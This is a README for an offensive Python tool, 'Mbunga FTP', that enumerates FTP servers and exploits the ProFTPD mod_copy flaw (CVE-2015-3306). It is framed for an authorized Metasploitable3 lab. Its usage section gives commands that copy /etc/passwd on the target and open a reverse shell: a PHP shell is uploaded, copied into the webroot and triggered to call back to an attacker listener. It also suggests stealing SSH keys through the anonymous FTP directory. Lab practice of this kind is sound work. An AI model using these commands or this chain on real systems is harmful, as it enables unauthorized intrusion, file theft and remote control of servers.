# Mbunga FTP v0.3

FTP enumeration + ProFTPD mod_copy exploitation for the authorized
Metasploitable3 lab. Pure Python sockets - no Metasploit, no Nmap.

## Install
```bash
python3 -m venv .venv
source .venv/bin/activate
pip install -e .
```

## Enumerate
```bash
mbunga-ftp 192.168.0.48
mbunga-ftp 192.168.0.48 --json ftp-result.json
```

## Exploit check / file copy PoC (CVE-2015-3306)
```bash
mbunga-ftp 192.168.0.48 --exploit
mbunga-ftp 192.168.0.48 --exploit --src /etc/passwd --dst /tmp/mbunga-proof.txt
```

## Reverse shell (PHP via webroot)
```bash
mbunga-ftp 192.168.0.48 --shell 192.168.0.10 --lport 4444
```

Chain: anonymous STOR of a PHP reverse shell -> SITE CPFR/CPTO copies it
into /var/www/html -> HTTP GET triggers it -> listener on LPORT catches
the shell. Options: --webroot, --http-port, --user, --passwd.

Escalation ideas: copy an SSH key into the anonymous FTP dir and RETR it,
or drop a PHP shell into the webroot.
